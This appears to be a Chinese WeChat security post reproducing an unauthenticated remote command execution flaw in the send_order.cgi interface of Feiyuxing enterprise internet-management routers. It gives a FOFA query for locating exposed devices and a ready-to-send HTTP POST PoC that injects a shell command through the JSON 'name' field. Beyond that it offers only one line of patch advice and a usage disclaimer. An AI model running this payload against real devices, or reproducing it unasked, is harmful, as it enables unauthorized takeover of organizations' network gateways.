#  ​飞鱼星企业级智能上网行为管理系统​ send_order.cgi 前台RCE漏洞复现   
 TKing的安全圈   2024-03-24 15:51  
  
飞鱼星企业级智能上网行为管理系统是成都飞鱼星科技开发有限公司开发的一款上网行为管理路由器，专为中小企业、政府机关、教育及科研机构等用户设计，是具备“
 
上网行为管理”、“多WAN路由器”以及“VPN网关”多重功能的新一代硬件网络接入设备。它能帮助企业对员工使用因特网的情况进行监控、生成报表并进行管理；帮助企业提高员工的生产率、节省网络带宽并且减少法律风险。  
### 0x01 漏洞概述  
  
飞鱼星企业级智能上网行为管理系统 send_order.cgi接口处存在远程命令执行漏洞，未经身份验证的攻击者可以利用此漏洞执行任意指令，且写入后门文件可获取服务器权限，造成严重威胁。  
### 0x03 复现环境  
  
FOFA：title=="飞鱼星企业级智能上网行为管理系统"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibvMRtaFJHSia6y2redE6YDWYYic9fqibDffy7G0j45c9dhaJia5ao5ELHW0txzSu1jwSxDOXhtG2RiaCoibiaBUvMPKA/640?wx_fmt=png&from=appmsg "")  
### 0x04 漏洞复现  
  
PoC  
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
{"opid":"1","name":";id;","type":"rest"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/6ibvMRtaFJHSia6y2redE6YDWYYic9fqibDfSy0ZxeRxBugA1SPiaYiaLe0RhBPIhPDOdcPY86VLh2uufNibUuXRjeYnw/640?wx_fmt=png&from=appmsg "")  
### 0x05 修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
```
公众号技术文章仅供诸位网络安全工程师对自己所管辖的网站、服务器、网络进行检测或维护时参考用，公众号的检测工具仅供各大安全公司的安全测试员安全测试使用。未经允许请勿利用文章里的技术资料对任何外部计算机系统进行入侵攻击，公众号的各类工具均不得用于任何非授权形式的安全测试。公众号仅提供技术交流，不对任何成员利用技术文章或者检测工具造成任何理论上的或实际上的损失承担责任。加微信进群获取更多资源：
```  
  
  
